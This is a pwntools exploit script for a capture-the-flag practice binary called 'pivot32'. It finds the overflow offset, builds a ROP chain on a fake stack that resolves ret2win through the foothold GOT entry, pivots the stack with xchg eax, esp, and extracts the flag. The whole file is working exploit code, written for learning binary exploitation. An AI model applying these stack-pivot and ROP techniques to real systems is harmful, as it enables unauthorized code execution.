#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template pivot32
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('pivot32')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)


def parse_pivot_addr(lines):
    addr = 0x0
    for line in lines:
        if 'kindly' in line:
            parts = line.split(" ")
            addr = int(parts[-1], 16)
            break
    return addr


# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     i386-32-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      No PIE (0x8048000)
# RPATH:    b'./'

check_offset = False
if check_offset:
    io = start()
    initial_lines = io.recvuntil(
            "Send your second chain now and it will land there").decode().split('\n')
    pivot_addr = parse_pivot_addr(initial_lines)
    info("pivot addr: %#x", pivot_addr)
    io.sendline(cyclic(254))
    io.recvuntil("Now kindly send your stack smash")
    io.sendline(cyclic(64))
    io.wait()
    core = io.corefile
    stack = core.eip
    info("stack: %#x", stack)
    offset = cyclic_find(stack)
    info("pattern: %r", stack)
    info("offset:  %d", offset)
    quit()

# Confirmed to be 44
OFFSET = 44

# CONSTANTS
foothold_plt = 0x80485f0
foothold_got = 0x804a024
ret2win_offset = 0x1f7
# 0x080488c0: pop eax; ret;
pop_eax = 0x80488c0
# 0x080488c2: xchg eax, esp; ret;
xchg_eax_esp = 0x80488c2
# 0x080488c4: mov eax, dword ptr [eax]; ret;
mov_eax_ptr_eax = 0x80488c4
# 0x08048571: pop ebx; ret;
pop_ebx = 0x8048571
# 0x080488c7: add eax, ebx; ret;
add_eax_ebx = 0x80488c7
# 0x080486a3: call eax;
call_eax = 0x80486a3

# build the secondary payload (this is our new/fake stack)
fake_stack = fit({
    0: [
        p32(foothold_plt),
        p32(pop_eax),
        p32(foothold_got),
        p32(mov_eax_ptr_eax),
        p32(pop_ebx),
        p32(ret2win_offset),
        p32(add_eax_ebx),
        p32(call_eax),
    ]}, length=254)

# save to disk for use with gdb
with open('fakestack.dat', 'wb') as out_file:
    out_file.write(fake_stack)

# now, we run the attack
io = start()
initial_lines = io.recvuntil("Send your second chain now and it will land there").decode().split('\n')
pivot_addr = parse_pivot_addr(initial_lines)
info("pivot addr: %#x", pivot_addr)

pid = util.proc.pidof(io)[0]
info("PID = %s", str(pid))

# uncomment to use the debugger
# util.proc.wait_for_debugger(pid)

# send the fake stack
io.sendline(fake_stack)

# build stack-pivot payload
payload = fit({
    OFFSET: [
        p32(pop_eax),
        p32(pivot_addr),
        p32(xchg_eax_esp)
    ]}, length=64)

# save to disk for use with gdb
with open('payload.dat', 'wb') as out_file:
    out_file.write(payload)

io.recvuntil("Now kindly send your stack smash")
# send our overflow/pivot
io.sendline(payload)
io.recv()
io.wait_for_close()

lines = io.recv().decode().split('\n')
flag = None
for line in lines:
    if 'flag' in line:
        # parse oddly, due to the way it is getting returned
        parts = line.split('pivot.so')
        flag = parts[1]
        break
success(flag)

